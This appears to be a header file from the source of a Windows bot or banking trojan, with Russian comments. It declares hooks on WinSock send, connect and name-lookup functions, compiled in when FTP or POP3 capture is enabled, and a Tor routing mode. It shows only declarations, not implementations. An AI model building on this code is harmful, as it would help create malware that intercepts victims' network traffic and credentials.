/*
  Перехват WinSocket.
*/
#pragma once

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
namespace SocketHook
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Перехватчик closesocket.
  */
  int WSAAPI hookerCloseSocket(SOCKET s);
  
  /*
    Перехватчик send.
  */
  int WSAAPI hookerSend(SOCKET s, const char *buf, int len, int flags);

  /*
    Перехватчик WSASend.
  */
  int WSAAPI hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine);

#if defined USE_TOR
  /*
    Перехватчик connect.
  */
  int WSAAPI hookerconnect(IN SOCKET s, IN const struct sockaddr FAR * name, IN int namelen);

  /*
    Перехватчик getaddrinfo.
  */
  int WSAAPI hookergetaddrinfo(const char FAR * nodename, const char FAR * servname, const struct addrinfo FAR * hints, struct addrinfo FAR * FAR * res);

  /*
    Перехватчик gethostbyname.
  */
  struct hostent FAR *WSAAPI hookergethostbyname(IN const char FAR * name);

  int WINAPI hookerWSAConnect(
  _In_   SOCKET s,
  _In_   const struct sockaddr *name,
  _In_   int namelen,
  _In_   LPWSABUF lpCallerData,
  _Out_  LPWSABUF lpCalleeData,
  _In_   LPQOS lpSQOS,
  _In_   LPQOS lpGQOS
);

  int WSAAPI hookerGetAddrInfoW(
  _In_opt_  PCWSTR pNodeName,
  _In_opt_  PCWSTR pServiceName,
  _In_opt_  const ADDRINFOW *pHints,
  _Out_     PADDRINFOW *ppResult
  );

  HANDLE WINAPI hookerWSAAsyncGetHostByName(
  _In_   HWND hWnd,
  _In_   unsigned int wMsg,
  _In_   const char *name,
  _Out_  char *buf,
  _In_   int buflen
  );

  void enableTorMode(bool enable);

  void WINAPI run_tor(void* p);
#endif
};
#endif
